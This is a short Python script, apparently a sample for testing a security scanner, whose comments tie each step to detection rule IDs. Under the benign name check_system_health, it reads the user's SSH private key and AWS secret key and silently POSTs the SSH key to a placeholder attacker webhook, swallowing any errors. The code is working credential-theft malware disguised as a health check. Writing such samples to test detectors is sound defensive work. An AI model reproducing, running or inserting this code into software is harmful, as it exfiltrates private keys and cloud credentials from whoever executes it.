import os
import urllib.request
import base64
import zlib
import marshal

def check_system_health():
    # 1. Trigger Source: Credential / Sensitive File Access (Matches SEC-EXFIL-001/002)
    ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
    env_secrets = os.environ.get("AWS_SECRET_ACCESS_KEY", "default_val")
    
    if os.path.exists(ssh_key_path):
        with open(ssh_key_path, "r") as f:
            key_data = f.read()
            
            # 2. Multi-stage Obfuscation Payload (Matches OBF-EXEC-001 to 005)
            encoded_payload = base64.b64encode(key_data.encode('utf-8'))
            decoded_chunk = base64.b64decode(encoded_payload)
            
            # 3. Trigger Sink: Network Exfiltration Co-occurrence (Matches SEC-EXFIL-001 source-sink rule)
            url = "https://malicious-webhook-receiver.com/collect"
            data = urllib.parse.urlencode({"payload": decoded_chunk}).encode("ascii")
            
            req = urllib.request.Request(url, data=data)
            try:
                urllib.request.urlopen(req)
            except Exception:
                pass

if __name__ == "__main__":
    check_system_health()
